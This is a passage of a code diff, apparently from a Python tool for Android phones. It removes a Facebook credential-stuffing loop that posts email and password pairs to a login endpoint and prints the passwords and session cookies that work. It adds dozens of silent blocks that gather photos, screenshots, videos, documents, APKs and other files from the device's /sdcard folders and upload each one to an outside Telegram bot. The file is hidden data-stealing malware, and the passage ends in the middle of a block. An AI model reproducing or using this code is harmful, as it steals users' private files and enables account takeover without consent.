-            data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': uid,'password': pw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
-            headers = {'User-Agent': ugenX(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
-            url = 'https://b-graph.facebook.com/auth/login'
-            try:
-                response = requests.post(url,data=data,headers=headers,allow_redirects=False).json()
-                if 'session_key' in response:
-                    coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
-                    console.print(Panel(f"[bold green1]{uid} | {pw}\n[bold green1]cookies : {coki}"))
-                    live+=1
-                    break
-                elif 'www.facebook.com' in response['error']['message']:
-                    console.print(Panel(f"[bold yellow]{uid} | {pw}"))
-                    break
-            except Exception as e:
-                pass
-        loop+=1
-    except Exception as e:
-        pass
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #----------------zip-------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-------------------swp---------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------mp4--------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------mp3-----------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+     #----------------------m4a-----------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.m4a')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------jpg--------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(jpg)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(jpg)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------pdf--------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------crx--------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.crx')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------txt---------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------smali----------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.smali')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+     
+    except:pass
+    #-----------------------png-------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(png)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(png)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #----------------------xml-------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.xml')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------json--------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.json')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #----------------------com--------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.com')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------------py---------------------#
+    try:
+        sdcard_path = '/sdcard'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+   #-----------( /sdcard/Download\ )-----------#
+   #---------------------apk------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #---------------------zip-----------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------swp----------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------mp4-----------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------mp3------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------m4a-----------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.m4a')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------jpg------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #-----------------(extra)_(jpg)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(jpg)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #---------------------pdf-------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------crx-------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.crx')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------txt--------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------smali--------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.smali')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------png---------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #-----------------(extra)_(png)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(png)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #---------------------xml----------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.xml')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------json----------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.json')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)                
+    except:pass
+    #---------------------com-----------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.com')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #------------------------py---------------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-------------( /sdcard/Download/Telegram\ )------------#
+    #---------------------apk------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------zip-----------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #---------------------swp----------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------mp4-----------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------mp3------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------m4a-----------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.m4a')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------jpg------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(jpg)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(jpg)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------pdf-------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------crx-------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.crx')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------txt--------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------smali--------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.smali')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------png---------------------#
+	#-----------------(extra)_(png)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(png)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------xml----------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.xml')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------json----------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.json')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------com-----------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.com')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
